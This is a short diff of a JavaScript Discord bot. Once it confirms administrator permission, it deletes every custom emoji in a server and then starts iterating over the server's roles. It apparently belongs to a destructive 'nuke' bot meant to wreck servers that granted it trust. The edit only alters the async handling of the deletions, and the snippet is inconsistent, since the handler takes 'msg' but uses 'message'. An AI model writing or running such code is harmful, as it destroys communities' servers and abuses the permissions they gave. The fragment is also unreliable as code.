@@ -167,8 +167,8 @@ client.on("message", msg => {
  if(message.channel.type === "dm") {return}
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
   }    
-  message.guild.emojis.cache.forEach(e => {
-    e.delete()})
+  message.guild.emojis.cache.forEach(async e => {
+    (await e).delete()})
 setTimeout(() => {
 
   message.guild.roles.cache.forEach(r => {
